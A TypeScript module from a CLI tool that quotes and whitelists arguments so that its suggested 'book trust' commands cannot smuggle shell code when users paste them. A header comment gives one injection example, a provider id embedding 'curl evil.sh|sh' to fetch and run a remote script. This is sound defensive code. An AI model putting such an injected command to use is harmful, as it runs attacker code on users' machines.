/**
 * The `book trust …` command lines Book suggests, built so that pasting one into a shell cannot
 * run anything the user did not read.
 *
 * Some of what a suggestion names is repository-authored: a provider id is any JSON key a
 * checked-in settings file writes, so an id like `x $(curl evil.sh|sh)` pasted bare into
 * "Run `book trust provider <id>`" would hand the user a command that runs the repository's shell
 * when copied. Every host that prints a trust command (doctor, the withheld-declaration notices,
 * the refusal errors, the `book trust` listing) builds it here.
 *
 * This lives outside `cli/` because the notices and the config loader print these commands too,
 * and non-CLI code may not import `cli/`.
 */
import { resolve } from 'path';
import { renderUntrustedText } from './hook-approvals.js';

/** Characters every supported shell passes through without quoting. */
const SHELL_SAFE_BARE = /^[A-Za-z0-9_@%+=:,./\\-]+$/;

/**
 * Render one argument for a command the user will paste into their own shell.
 *
 * It has to survive both a POSIX shell and `cmd.exe`, where single quotes are literal — the
 * reason the old `book config set … '<json>'` suggestion reached validation as a string on
 * Windows and failed. Double quotes are the one form both accept, so anything needing quotes gets
 * those; a value carrying a character neither can quote verbatim gets no one-liner at all.
 */
export function shellArgument(value: string): string | null {
  if (SHELL_SAFE_BARE.test(value)) return value;
  // `"`, a backtick and `$` expand inside double quotes; `!` expands history in an interactive
  // bash; a control character (an escape sequence, a newline) is not something to paste.
  if (/["`$!\u0000-\u001f\u007f-\u009f]/.test(value) || value.endsWith('\\')) return null;
  return `"${value}"`;
}

/**
 * What a provider id may be for its name to go on a command line: the safe-bare characters minus
 * the backslash and `%` (cmd.exe expands `%VAR%` even inside quotes), and a space. An id is
 * repository-authored, so this is a whitelist, not the blacklist {@link shellArgument} applies
 * to a path the user chose.
 */
const PASTEABLE_PROVIDER_ID = /^[A-Za-z0-9_@+=:,./ -]+$/;

/**
 * A `book trust …` command targeting `workspace`, or null when the path cannot be quoted safely.
 *
 * `book trust` defaults to `process.cwd()`, so a suggestion printed for a run launched with
 * `-w /repo` from another directory would otherwise record the decision in the wrong project.
 * `--workspace` is added whenever the workspace is not the current directory.
 */
export function trustCommandLine(workspace: string, rest: string): string | null {
  if (resolve(workspace) === resolve(process.cwd())) return `book trust ${rest}`;
  const quoted = shellArgument(workspace);
  return quoted === null ? null : `book trust ${rest} --workspace ${quoted}`;
}

/** A suggested command, and what to add after it when the path defeated quoting. */
export interface TrustCommandText {
  /** The command, without backticks. */
  command: string;
  /** Empty, or a parenthetical naming the directory to run it from. */
  note: string;
}

/** {@link trustCommandLine}, with the fallback a caller prints when the workspace path defeats it. */
export function trustCommandText(workspace: string, rest: string): TrustCommandText {
  const command = trustCommandLine(workspace, rest);
  return command === null
    ? { command: `book trust ${rest}`, note: ` (run it from ${renderUntrustedText(workspace)})` }
    : { command, note: '' };
}

/**
 * The `book trust provider` command for one provider id, or for the listing when no id is given
 * or the id cannot be pasted safely.
 *
 * A provider id is repository-authored. One a shell would interpret (`$`, a backtick, a quote,
 * a newline) or an option parser would (a leading `-`) is never put on the command line: the
 * command then lists what is awaiting a decision instead, and the user approves by typing the id
 * themselves after reading it.
 */
export function providerTrustCommand(workspace: string, providerId?: string): TrustCommandText {
  const quoted =
    providerId === undefined ||
    providerId.startsWith('-') ||
    !PASTEABLE_PROVIDER_ID.test(providerId)
      ? null
      : shellArgument(providerId);
  return trustCommandText(workspace, quoted === null ? 'provider' : `provider ${quoted}`);
}
